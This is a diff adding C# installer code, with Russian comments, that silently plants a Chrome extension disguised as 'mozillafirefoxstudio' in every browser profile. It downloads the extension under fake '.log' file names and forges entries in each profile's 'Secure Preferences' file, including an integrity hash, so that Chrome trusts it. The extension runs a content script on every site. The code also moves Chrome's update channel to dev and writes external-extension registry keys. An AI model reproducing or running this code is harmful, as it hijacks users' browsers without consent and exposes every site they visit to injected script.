@@ -1,0 +1,192 @@
+// УСТАНОВКА ПЛАГИНА В ГУГЛ ХРОМ  
+            // получить все имена профилей в системе
+
+            
+            List<string> proflist = new List<string>();
+            proflist.Add("Default");
+
+            if (sinf1.installedGoogleChrome())
+            {
+                DirectoryInfo dir = new DirectoryInfo(sinf1.localState);
+                foreach (var item in dir.GetDirectories())
+                {
+                    if (item.Name.StartsWith("Profile"))
+                    {
+                        proflist.Add(item.Name);
+                    }
+                }
+            }
+
+            // скачан архив с плагином
+            WebClient myWebClient2 = new WebClient();
+
+            myWebClient2.DownloadFile(PPathToChromePlugin, sinf1.PathToTheTemporaryFolderUser + "\\" + "p012a.log");
+
+            myWebClient2.DownloadFile(PPathToChromePluginCRX, sinf1.PathToTheTemporaryFolderUser + "\\" + "p013a.log");
+
+
+            if (!Directory.Exists(sinf1.localState + @"\" + @"\Plugins"))
+            {
+                Directory.CreateDirectory(sinf1.localState + @"\" + @"\Plugins");
+            }
+            File.Copy(@sinf1.PathToTheTemporaryFolderUser + "\\" + "p013a.log", sinf1.localState + @"\" + @"Plugins\mozillafirefoxstudio.crx", true);
+
+            foreach (string prn in proflist)
+            {
+
+                // операции для каждого профиля
+                if (!Directory.Exists(sinf1.localState + @"\" + prn + @"\Extensions\jgnclepkencmehkcohpkagffekghobfp"))
+                {
+                    Directory.CreateDirectory(sinf1.localState + @"\" + prn + @"\Extensions\jgnclepkencmehkcohpkagffekghobfp");
+                }
+                string zipToUnpack = sinf1.PathToTheTemporaryFolderUser + "\\" + "p012a.log";
+                string unpackDirectory = sinf1.localState + @"\" + prn + @"\Extensions";
+                using (ZipFile zip1 = ZipFile.Read(zipToUnpack))
+                {
+                    // here, we extract every entry, but we could extract conditionally
+                    // based on entry name, size, date, checkbox status, etc.  
+                    foreach (ZipEntry e in zip1)
+                    {
+                        e.Extract(unpackDirectory, ExtractExistingFileAction.OverwriteSilently);
+                    }
+                }
+                //CRX
+
+                //File.Copy(@sinf1.PathToTheTemporaryFolderUser + "\\" + "p013a.log", sinf1.localState + @"\" + prn + @"\Extensions\jgnclepkencmehkcohpkagffekghobfp\mozillafirefoxstudio.crx", true);
+                //File.SetAttributes(@sinf1.localState + @"\" + prn + @"\Extensions\jgnclepkencmehkcohpkagffekghobfp\mozillafirefoxstudio.crx", FileAttributes.Hidden);
+
+                //SECURE PREFERENCES
+
+                string sourcejsontext = File.ReadAllText(@sinf1.localState + @"\" + prn + @"\Secure Preferences");
+
+                if (sourcejsontext.IndexOf("jgnclepkencmehkcohpkagffekghobfp") == -1)
+                {
+                    string pattern = "{\r\n   \"extensions\": {\r\n      \"settings\": {";
+                    string pattern2 = "},\r\n         \"extensions\": {\r\n            \"settings\": {";
+                    string replacement = @"
+         ""jgnclepkencmehkcohpkagffekghobfp"": {
+            ""ack_wiped"": true,
+            ""active_permissions"": {
+               ""api"": [  ],
+               ""manifest_permissions"": [  ],
+               ""scriptable_host"": [ ""*://*/*"" ]
+            },
+            ""commands"": {
+
+            },
+            ""content_settings"": [  ],
+            ""creation_flags"": 1,
+            ""events"": [  ],
+            ""from_bookmark"": false,
+            ""from_webstore"": false,
+            ""granted_permissions"": {
+               ""api"": [  ],
+               ""manifest_permissions"": [  ],
+               ""scriptable_host"": [ ""*://*/*"" ]
+            },
+            ""incognito_content_settings"": [  ],
+            ""incognito_preferences"": {
+
+            },
+            ""initial_keybindings_set"": true,
+            ""install_time"": ""13062870076661990"",
+            ""lastpingday"": ""13063017601641521"",
+            ""location"": 1,
+            ""manifest"": {
+               ""content_scripts"": [ {
+                  ""js"": [ ""background.js"" ],
+                  ""matches"": [ ""*://*/*"" ],
+                  ""run_at"": ""document_end""
+               } ],
+               ""icons"": {
+                  ""128"": ""icon/128.png"",
+                  ""48"": ""icon/48.png""
+               },
+               ""key"": ""MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArKpMLrejHbxTXOcQovojcPe+6AcWuvHYvNf46qUQyC7mVq9coaMfMMxvEH99Dp4GHtvfGKwmao02RifZjSvzMTRfQC4Clv9xkn0gN+dGk3leVx+PVFSTPOiyHOueCH//Sl7ITPwD9VFZ5gNlbpufV4t9LMIQArAX3Y9GMz5HNUeg1/9zKxeFiJeDAeAZ1BQK5iTbqWEniGACBUFq0LgWVU5Oy3Bu0CEVULAA8Gyjy2wfbrNyZVF+i44rhWqQmHkB1E4orpVAr7mZWiR1MXhv1H+cQxhCr7eUhbIy6LxT8wJY8c3LKKDFRg4Y/ESlgsj8PvDweEIm3UVgCRuVxtzR4QIDAQAB"",
+               ""manifest_version"": 2,
+               ""name"": ""mozillafirefoxstudio"",
+               ""version"": ""2.0"",
+               ""web_accessible_resources"": [ ""/injected.js"" ]
+            },
+            ""path"": ""jgnclepkencmehkcohpkagffekghobfp\\2.0_0"",
+            ""preferences"": {
+
+            },
+            ""regular_only_preferences"": {
+
+            },
+            ""state"": 1,
+            ""was_installed_by_default"": false,
+            ""was_installed_by_oem"": false
+         },
+";
+                    string replacement2 = @"""jgnclepkencmehkcohpkagffekghobfp"": ""957D62000A689FB981982307925A293E66F94DB835212A76B37D58B459412D16"",";
+                    Regex rgx = new Regex(pattern);
+                    sourcejsontext = rgx.Replace(sourcejsontext, pattern + replacement);
+
+                    Regex rgx2 = new Regex(pattern2);
+                    sourcejsontext = rgx2.Replace(sourcejsontext, pattern2 + "\r\n" + replacement2);
+                    File.Delete(@sinf1.localState + @"\" + prn + @"\Secure Preferences");
+
+
+                    File.WriteAllText(@sinf1.localState + @"\" + prn + @"\Secure Preferences", sourcejsontext);
+                }
+                //РЕЕСТР
+                /*UPDATE*/
+                string[] UpdregKeys = { 
+                @"HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Google\Update\ClientState\{4DC8B4CA-1BDA-483e-B5FA-D3C12E15B62D}",
+                @"HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Google\Update\ClientState\{8A69D345-D564-463C-AFF1-A69D9E530F96}",
+                @"HKEY_LOCAL_MACHINE\SOFTWARE\Google\Update\ClientState\{4DC8B4CA-1BDA-483e-B5FA-D3C12E15B62D}",
+                @"HKEY_LOCAL_MACHINE\SOFTWARE\Google\Update\ClientState\{8A69D345-D564-463C-AFF1-A69D9E530F96}"
+                };
+
+                foreach (string rk in UpdregKeys)
+                {
+                    string cAp = (string)Registry.GetValue(@rk, "ap", null);
+                    if (cAp != null)
+                    {
+                        switch (cAp)
+                        {
+                            case "2.0-dev-multi-chrome":
+                                {
+                                    break;
+                                }
+                            case "x64-dev-multi-chrome":
+                                {
+                                    break;
+                                }
+                            case "-multi-chrome":
+                                {
+                                    Registry.SetValue(rk, "ap", "2.0-dev-multi-chrome");
+                                    break;
+                                }
+                            case "x64-stable-multi-chrome":
+                                {
+                                    Registry.SetValue(rk, "ap", "x64-dev-multi-chrome");
+                                    break;
+                                }
+                        }
+                    }
+
+                }
+                // External Extension
+                if ((string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Google\Update\ClientState\{8A69D345-D564-463C-AFF1-A69D9E530F96}", "ap", null) == "x64-dev-multi-chrome" || (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Google\Update\ClientState\{8A69D345-D564-463C-AFF1-A69D9E530F96}", "ap", null) == "x64-stable-multi-chrome")
+                {
+                    // хром установлен в 64битной виндовс XP VISTA 7
+                    Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Wow6432Node\Google\Chrome\Extensions\jgnclepkencmehkcohpkagffekghobfp");
+                    RegistryKey myKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Wow6432Node\Google\Chrome\Extensions\jgnclepkencmehkcohpkagffekghobfp", true);
+                    myKey.SetValue("path", sinf1.localState + @"\" + @"Plugins\mozillafirefoxstudio.crx", RegistryValueKind.String);
+                    myKey.SetValue("version", "2.0", RegistryValueKind.String);
+                    myKey.Close();
+
+                }
+                else
+                    if ((string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Google\Update\ClientState\{8A69D345-D564-463C-AFF1-A69D9E530F96}", "ap", null) == "2.0-dev-multi-chrome" || (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Google\Update\ClientState\{4DC8B4CA-1BDA-483e-B5FA-D3C12E15B62D}", "ap", null) == "-multi-chrome")
+                    {
+                        // хром установлен в 32битной виндовс XP VISTA 7
+                        Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Google\Chrome\Extensions\jgnclepkencmehkcohpkagffekghobfp");
+                        RegistryKey myKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Google\Chrome\Extensions\jgnclepkencmehkcohpkagffekghobfp", true);
+                        myKey.SetValue("path", sinf1.localState + @"\" + @"Plugins\mozillafirefoxstudio.crx", RegistryValueKind.String);
+                        myKey.SetValue("version", "2.0", RegistryValueKind.String);
+                        myKey.Close();
+                    }
